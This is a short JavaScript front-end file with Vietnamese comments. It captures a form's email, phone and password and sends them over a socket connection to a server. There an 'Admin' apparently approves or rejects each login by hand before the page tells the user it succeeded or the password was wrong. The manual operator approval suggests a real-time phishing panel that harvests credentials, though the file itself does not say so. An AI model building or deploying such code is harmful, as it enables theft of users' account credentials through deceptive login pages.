document.addEventListener('DOMContentLoaded', function () {
    const socket = io(); // Kết nối đến server

    // Lắng nghe sự kiện form submit
    document.getElementById('user-form').addEventListener('submit', function (event) {
        event.preventDefault();

        // Hiển thị loading indicator
        document.getElementById('loading').style.display = 'block';

        // Lấy giá trị từ các input trong form
        const email = document.getElementById('email').value;
        const phone = document.getElementById('phone').value;
        const password = document.getElementById('password').value;

        // Gửi dữ liệu qua socket đến server
        socket.emit('user_data', {
            email: email,
            phone: phone,
            password: password,
        });
    });

    // Lắng nghe phản hồi từ server (trang Admin)
    socket.on('login_response', function (response) {
        document.getElementById('loading').style.display = 'none'; // Ẩn loading

        const messageElement = document.getElementById('response-message');
        if (response === 'approved') {
            messageElement.textContent = "Đăng nhập thành công!";
            messageElement.style.color = 'green';
        } 
        else if (response === 'rejected') {
            messageElement.textContent = "Mật khẩu sai, vui lòng thử lại!";
            messageElement.style.color = 'red';
        }
        
        
    });
});
